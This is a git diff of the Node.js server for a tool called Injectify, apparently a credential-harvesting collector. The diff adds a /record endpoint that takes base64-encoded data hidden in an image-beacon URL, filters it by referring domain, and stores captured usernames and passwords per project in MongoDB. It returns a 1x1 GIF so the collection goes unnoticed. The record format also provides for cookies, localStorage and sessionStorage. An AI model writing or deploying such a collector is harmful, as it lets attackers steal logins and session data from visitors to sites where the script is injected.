@@ -1,6 +1,6 @@
 // Configuration
 const config = {
-	debug 	: false,
+	debug 	: true,
 	mongodb : 'mongodb://localhost:19000/injectify',
 	express : 3000,
 	dev		: process.env.NODE_ENV.toUpperCase() == 'DEVELOPMENT',
@@ -18,6 +18,7 @@ const server 		= app.listen(config.express)
 const io 			= require('socket.io').listen(server)
 const path 			= require('path')
 const request 		= require('request')
+const {URL}			= require('url')
 const chalk 		= require('chalk')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
@@ -137,15 +138,18 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							projects.insertOne({
 								name		: project,
 								permissions : {
-									owner	: user.id,
-									admin	: [],
+									owners	: [user.id],
+									admins	: [],
 									readonly: []
 								},
 								config		: {
-									domains		: [],
+									filter		: {
+										type	: "whitelist",
+										domains	: []
+									},
 									created_at	: Math.round(new Date().getTime() / 1000)
 								},
-								records		: {}
+								records		: []
 							}, (err, res) => {
 								if (err) {
 									throw err
@@ -275,10 +279,6 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	});
 
-
-	// Enable EJS
-	//app.set('view engine', 'ejs')
-
 	app.get('/auth/github', (req, res) => {
 		if (req.query.code) {
 			res.sendFile(__dirname + '/www/auth.html')
@@ -290,8 +290,114 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			}))
 		}
 	})
-	// Proxy through to webpack-dev-server
+
+	app.get('/record/*', (req, res) => {
+		var validate = base64 => {
+			return new Promise((resolve, reject) => {
+				if (typeof base64 === "string") {
+					try {
+						let json = JSON.parse(Buffer.from(base64, 'base64').toString())
+						if (json) resolve(json)
+					} catch (e) {
+						reject(Error("invalid base64 encoded json string (" + e + ")"))
+					}
+				} else {
+					reject(Error("empty request path"))
+				}
+			})
+		}
+		var Record = record => {
+			return new Promise((resolve, reject) => {
+				let project			= "a",
+					username		= "b",
+					password		= "c",
+					url				= "d",
+					width			= "e",
+					height			= "f",
+					localStorage	= "g",
+					sessionStorage	= "h",
+					cookies			= "i"
+				if (record[project]) {
+					db.collection('projects', (err, projects) => {
+						if (err) throw err
+						projects.findOne({name: record[project]}).then(doc => {
+							if(doc !== null) {
+								if (req.header('Referer') && doc.config.filter.domains.length > 0) {
+									let referer = new URL(req.header('Referer')),
+										allowed
+									if (doc.config.filter.type.toLowerCase() == "whitelist")
+										allowed = false
+									else
+										allowed = true
+									doc.config.filter.domains.forEach(domain => {
+										domain = new URL(domain)
+										if (doc.config.filter.type.toLowerCase() == "whitelist") {
+											// Whitelist
+											if (domain.host == referer.host) allowed = true
+										} else {
+											// Blacklist
+											if (domain.host == referer.host) allowed = false
+										}
+									})
+									if (!allowed) {
+										if (doc.config.filter.type.toLowerCase() == "whitelist")
+											reject("domain hasn't been whitelisted, not recording")
+										else
+											reject("domain has been blacklisted, not recording")
+										return
+									}
+								}
+								projects.updateOne({
+									name: record[project]
+								},
+								{
+									$push: {
+										records: [{
+											username: record[username],
+											password: record[password]
+										}]
+									}
+								}).then(() => {
+									resolve("wrote record to database")
+								})
+							} else {
+								reject("project " + record[project] + " doesn't exist")
+							}
+						})
+					})
+				}
+			})
+		}
+		// Send a 1x1px gif
+		let data = [
+			0x47,0x49, 0x46,0x38, 0x39,0x61, 0x01,0x00, 0x01,0x00, 0x80,0x00, 0x00,0xFF, 0xFF,0xFF,
+			0x00,0x00, 0x00,0x21, 0xf9,0x04, 0x04,0x00, 0x00,0x00, 0x00,0x2c, 0x00,0x00, 0x00,0x00,
+			0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
+		]
+		res.set('Content-Type', 'image/gif')
+		   .set('Content-Length', data.length)
+		   .status(200)
+		   .send(new Buffer(data))
+
+		validate(req.path.substring(1).split(/\/(.+)?/, 2)[1]).then(record => {
+			Record(record).then(message => {
+				if (config.debug) console.log(
+					chalk.greenBright("[record] ") + 
+					chalk.yellowBright(message)
+				)
+			}).catch(error => {
+				if (config.debug) console.log(
+					chalk.redBright("[record] ") + 
+					chalk.yellowBright(error)
+				)
+			})
+		}).catch(error => {
+			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
+		})
+	})
+
 	if (config.dev) {
+		// Proxy through to webpack-dev-server if in development mode
 		app.use('/*', (req, res) => {
 			request("http://localhost:8080" + req.originalUrl).pipe(res);
 		})
